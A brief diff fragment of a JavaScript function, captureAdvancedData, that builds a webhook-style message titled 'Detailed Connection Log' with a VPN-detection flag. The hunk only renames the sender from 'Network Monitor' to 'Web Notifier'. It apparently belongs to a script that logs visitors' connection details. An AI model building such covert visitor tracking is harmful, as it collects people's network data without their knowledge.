@@ -10,7 +10,7 @@ async function captureAdvancedData() {
         const vpnStatus = isProxy ? "[!] VPN" : "⚠ No VPN";
 
         const payload = {
-            username: 'Network Monitor',
+            username: 'Web Notifier',
             avatar_url: 'https://i1.sndcdn.com/artworks-EcUsidnDBPcL9XiX-cJz3GA-t500x500.jpg',
             embeds: [{
                 title: '🌐 Detailed Connection Log',
